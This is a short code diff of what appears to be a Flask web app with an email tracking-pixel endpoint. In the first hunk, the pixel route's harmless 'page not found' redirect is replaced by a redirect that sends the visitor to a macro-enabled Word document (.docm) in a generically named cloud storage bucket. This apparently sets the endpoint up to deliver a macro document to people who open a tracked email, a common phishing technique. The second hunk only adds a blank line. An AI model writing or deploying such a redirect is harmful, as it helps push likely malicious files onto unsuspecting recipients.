@@ -94,7 +94,7 @@ def pixel():
     #resp.headers["Cache-Control"] = "no-cache, no-store, must-revalidate, max-age=0"
     #resp.headers["Pragma"] = "no-cache"
     #webbrowser.open("https://mail.google.com/")
-    return redirect("/pagenotfound", code=302)
+    return redirect("https://storage.googleapis.com/cloud-storage32025/ICSTL-2025.docm", code=302)
 
 # -------- ADMIN AUTH CHECK --------
 def require_admin():
@@ -297,6 +297,7 @@ def index():
 # -------- RUN (local) --------
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
+
 
 
 
